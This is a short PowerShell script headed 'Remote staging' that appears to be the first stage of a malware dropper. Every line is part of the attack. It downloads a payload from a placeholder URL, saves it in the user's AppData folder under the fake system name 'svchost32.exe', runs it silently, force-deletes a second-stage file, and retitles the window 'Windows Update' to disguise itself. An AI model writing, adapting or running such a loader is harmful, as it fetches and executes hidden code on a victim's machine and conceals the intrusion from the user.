
# Remote staging
$Stage1Url = 'https://localhost:8080/payload.bin'
$DropPath = "$env:APPDATA\svchost32.exe"
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $DropPath)
Start-Process -FilePath $DropPath -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$Host.UI.RawUI.WindowTitle = "Windows Update"
